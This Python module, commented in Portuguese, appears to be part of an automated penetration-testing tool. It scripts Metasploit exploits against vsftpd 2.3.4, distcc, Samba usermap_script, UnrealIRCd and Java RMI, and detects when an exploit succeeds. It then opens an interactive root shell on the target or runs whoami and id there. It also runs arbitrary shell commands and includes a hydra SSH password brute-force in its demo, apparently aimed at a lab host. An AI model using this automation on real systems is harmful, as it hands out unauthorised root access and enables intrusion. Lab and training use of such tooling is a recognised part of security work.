"""
Smart Executor - Executa comandos automaticamente escolhendo entre subprocess e PTY.

Detecta quando um comando precisa de interação real (exploits, shells) e usa PTY,
caso contrário usa subprocess normal.
"""

import re
import time
import subprocess
from typing import Optional, Tuple, List
from dataclasses import dataclass


@dataclass
class ExploitSequence:
    """Sequência de comandos para um exploit específico."""
    name: str
    module: str
    commands: List[str]
    success_patterns: List[str]
    timeout: int = 120


# Exploits conhecidos que precisam de PTY
KNOWN_EXPLOITS = {
    "vsftpd": ExploitSequence(
        name="vsftpd 2.3.4 Backdoor",
        module="exploit/unix/ftp/vsftpd_234_backdoor",
        commands=[
            "use exploit/unix/ftp/vsftpd_234_backdoor",
            "set RHOSTS {target}",
            "exploit"
        ],
        success_patterns=["session", "opened", "shell", "command shell", "uid=0"],
        timeout=60
    ),
    "distcc": ExploitSequence(
        name="DistCC Daemon Command Execution",
        module="exploit/unix/misc/distcc_exec",
        commands=[
            "use exploit/unix/misc/distcc_exec",
            "set RHOSTS {target}",
            "run"
        ],
        success_patterns=["session", "opened"],
        timeout=60
    ),
    "samba": ExploitSequence(
        name="Samba usermap_script",
        module="exploit/multi/samba/usermap_script",
        commands=[
            "use exploit/multi/samba/usermap_script",
            "set RHOSTS {target}",
            "run"
        ],
        success_patterns=["session", "opened", "shell"],
        timeout=60
    ),
    "unrealirc": ExploitSequence(
        name="UnrealIRCd Backdoor",
        module="exploit/unix/irc/unreal_ircd_3281_backdoor",
        commands=[
            "use exploit/unix/irc/unreal_ircd_3281_backdoor",
            "set RHOSTS {target}",
            "run"
        ],
        success_patterns=["session", "opened"],
        timeout=60
    ),
    "java_rmi": ExploitSequence(
        name="Java RMI Server Insecure Default Configuration",
        module="exploit/multi/misc/java_rmi_server",
        commands=[
            "use exploit/multi/misc/java_rmi_server",
            "set RHOSTS {target}",
            "run"
        ],
        success_patterns=["session", "opened", "meterpreter"],
        timeout=90
    ),
}


def detect_exploit_type(command: str) -> Optional[str]:
    """Detecta se o comando é um exploit conhecido."""
    cmd_lower = command.lower()
    
    for key, exploit in KNOWN_EXPLOITS.items():
        if key in cmd_lower or exploit.module in cmd_lower:
            return key
    
    return None


def needs_pty_execution(command: str) -> bool:
    """
    Determina se um comando precisa de execução PTY.
    
    Retorna True para:
    - Exploits do Metasploit que criam sessões
    - Comandos interativos (ftp, ssh sem comando, telnet)
    - Shells reversos
    """
    cmd_lower = command.lower()
    
    # Exploits conhecidos
    if detect_exploit_type(command):
        return True
    
    # Metasploit exploits genéricos
    if "msfconsole" in cmd_lower and "exploit/" in cmd_lower:
        return True
    
    # Comandos interativos puros (sem flags de automação)
    interactive_patterns = [
        r'^ftp\s+\d+\.\d+\.\d+\.\d+\s*$',  # ftp IP (sem comandos)
        r'^ssh\s+\w+@\d+\.\d+\.\d+\.\d+\s*$',  # ssh user@IP (sem comando)
        r'^telnet\s+\d+\.\d+\.\d+\.\d+',  # telnet
        r'^nc\s+-l',  # netcat listener
    ]
    
    for pattern in interactive_patterns:
        if re.match(pattern, cmd_lower):
            return True
    
    return False


def execute_with_pty(command: str, target_ip: str, timeout: int = 120, interactive: bool = True) -> Tuple[str, bool]:
    """
    Executa comando usando PTY para interação real.
    
    Usado para exploits que precisam manter sessão.
    Se interactive=True e o exploit funcionar, abre shell interativa.
    
    Returns:
        Tupla (output, success)
        - Se shell interativa foi usada, output contém "SHELL_SESSION_COMPLETED"
    """
    import pexpect
    import sys
    
    output_lines = []
    success = False
    shell_session_completed = False
    
    # Detecta tipo de exploit
    exploit_key = detect_exploit_type(command)
    
    if exploit_key and exploit_key in KNOWN_EXPLOITS:
        exploit = KNOWN_EXPLOITS[exploit_key]
        
        print(f"[PTY] Iniciando msfconsole para {exploit.name}...")
        
        # Usa pexpect diretamente para melhor controle
        child = pexpect.spawn('msfconsole -q', encoding='utf-8', timeout=60)
        
        try:
            # Aguarda prompt inicial
            child.expect(['msf.*>', 'msf'], timeout=30)
            output_lines.append("[+] msfconsole iniciado")
            
            # Executa sequência de comandos
            for cmd in exploit.commands:
                cmd = cmd.format(target=target_ip)
                print(f"[PTY] > {cmd}")
                child.sendline(cmd)
                
                # Para o comando exploit, não espera prompt imediato
                if cmd == 'exploit' or cmd == 'run':
                    time.sleep(2)
                else:
                    child.expect(['msf.*>', 'msf'], timeout=15)
                    
                output_lines.append(f"> {cmd}")
                if child.before:
                    output_lines.append(child.before)
            
            # Aguarda resultado do exploit
            print("[PTY] Aguardando resultado do exploit...")
            time.sleep(10)  # Tempo para o exploit executar
            
            # Verifica se sessão foi criada lendo o output
            try:
                child.expect([pexpect.TIMEOUT], timeout=5)
            except:
                pass
            
            if child.before:
                output_lines.append(child.before)
                full_output = child.before.lower()
                
                # Verifica padrões de sucesso
                for pattern in exploit.success_patterns:
                    if pattern in full_output:
                        success = True
                        print(f"[PTY] Exploit bem-sucedido! Padrão: {pattern}")
                        break
            
            # Se tiver sessão e modo interativo, abre shell direto
            if success and interactive:
                # Cores para o banner
                CYAN = "\033[38;5;45m"
                GREEN = "\033[38;5;42m"
                RED = "\033[38;5;196m"
                YELLOW = "\033[38;5;220m"
                BOLD = "\033[1m"
                RESET = "\033[0m"
                
                # Banner
                print(f"\n{GREEN}{'='*60}{RESET}")
                print(f"{GREEN}{BOLD}[+] SHELL OBTIDA COM SUCESSO!{RESET}")
                print(f"{GREEN}{'='*60}{RESET}")
                print(f"{CYAN}[*]{RESET} Target: {YELLOW}{target_ip}{RESET}")
                print(f"{CYAN}[*]{RESET} Exploit: {YELLOW}{exploit.name}{RESET}")
                print(f"{GREEN}{'='*60}{RESET}")
                print(f"{CYAN}[*]{RESET} Você está na shell do alvo!")
                print(f"{CYAN}[*]{RESET} Pressione {RED}Ctrl+]{RESET} para sair")
                print(f"{GREEN}{'='*60}{RESET}\n")
                
                # Modo interativo real - usuário controla diretamente
                # O exploit vsftpd já abre a shell automaticamente, não precisa de sessions -i
                child.interact()
                
                shell_session_completed = True
                output_lines.append("[+] SHELL_SESSION_COMPLETED - Sessão interativa encerrada pelo usuário")
                output_lines.append(f"[+] Acesso root obtido em {target_ip}")
                
                print(f"\n{GREEN}[+]{RESET} Shell encerrada. Objetivo alcançado!")
                
            elif success:
                # Modo não-interativo - só coleta info
                # O exploit vsftpd já está na shell, não precisa de sessions -i
                print("[PTY] Coletando informações da shell...")
                
                child.sendline('whoami')
                time.sleep(2)
                try:
                    child.expect([pexpect.TIMEOUT], timeout=3)
                except:
                    pass
                if child.before:
                    output_lines.append(f"whoami: {child.before}")
                
                child.sendline('id')
                time.sleep(2)
                try:
                    child.expect([pexpect.TIMEOUT], timeout=3)
                except:
                    pass
                if child.before:
                    output_lines.append(f"id: {child.before}")
                
                # Fecha
                child.sendline('exit')
                time.sleep(1)
            else:
                # Fecha se não teve sucesso
                child.sendline('exit')
            
        except pexpect.TIMEOUT:
            output_lines.append("[TIMEOUT] Operação expirou")
        except pexpect.EOF:
            output_lines.append("[EOF] Processo encerrado")
        except KeyboardInterrupt:
            output_lines.append("[*] Interrompido pelo usuário")
            if success:
                shell_session_completed = True
                output_lines.append("[+] SHELL_SESSION_COMPLETED")
        finally:
            if child.isalive():
                child.close()
        
    else:
        # Comando genérico - usa PTY executor
        from pty_executor import get_executor
        executor = get_executor()
        
        print(f"[PTY] Executando comando genérico...")
        session_id = executor.spawn_session(command, timeout=timeout)
        time.sleep(3)
        
        output = executor.read_output(session_id, timeout=5)
        output_lines.append(output)
        
        executor.close_session(session_id)
        success = len(output) > 0
    
    return "\n".join(output_lines), success


def execute_with_subprocess(command: str, timeout: int = 180) -> Tuple[str, bool]:
    """Executa comando usando subprocess normal."""
    try:
        result = subprocess.run(
            command, 
            shell=True, 
            capture_output=True, 
            text=True, 
            timeout=timeout
        )
        output = result.stdout + result.stderr
        success = result.returncode == 0
        
        # Ajusta sucesso para ferramentas específicas
        output_lower = output.lower()
        if "nmap" in command.lower() and "nmap scan report" in output_lower:
            success = True
        if "hydra" in command.lower() and ("valid password" in output_lower or "[data]" in output_lower):
            success = True
        if "nikto" in command.lower() and "server:" in output_lower:
            success = True
            
        return output.strip(), success
        
    except subprocess.TimeoutExpired:
        return f"TIMEOUT after {timeout}s", False
    except Exception as e:
        return f"ERROR: {e}", False


def smart_execute(command: str, target_ip: str = None, timeout: int = 180) -> Tuple[str, bool]:
    """
    Executa comando de forma inteligente, escolhendo entre subprocess e PTY.
    
    Args:
        command: Comando a executar
        target_ip: IP do alvo (para exploits)
        timeout: Timeout em segundos
        
    Returns:
        Tupla (output, success)
    """
    if needs_pty_execution(command):
        print(f"[SMART] Usando PTY para comando interativo")
        return execute_with_pty(command, target_ip, timeout)
    else:
        print(f"[SMART] Usando subprocess para comando não-interativo")
        return execute_with_subprocess(command, timeout)


# === Funções de conveniência para exploits específicos ===

def run_vsftpd_exploit(target_ip: str) -> Tuple[str, bool]:
    """Executa exploit vsftpd 2.3.4 backdoor."""
    return execute_with_pty("vsftpd", target_ip)


def run_distcc_exploit(target_ip: str) -> Tuple[str, bool]:
    """Executa exploit DistCC."""
    return execute_with_pty("distcc", target_ip)


def run_samba_exploit(target_ip: str) -> Tuple[str, bool]:
    """Executa exploit Samba usermap_script."""
    return execute_with_pty("samba", target_ip)


if __name__ == "__main__":
    print("=== Smart Executor Demo ===\n")
    
    # Testa detecção
    test_commands = [
        "nmap -sV 172.20.0.6",
        "msfconsole -q -x 'use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS 172.20.0.6; run'",
        "hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://172.20.0.6",
        "ftp 172.20.0.6",
        "ssh root@172.20.0.6",
    ]
    
    for cmd in test_commands:
        needs_pty = needs_pty_execution(cmd)
        exploit = detect_exploit_type(cmd)
        print(f"CMD: {cmd[:60]}...")
        print(f"  Needs PTY: {needs_pty}")
        print(f"  Exploit: {exploit}")
        print()
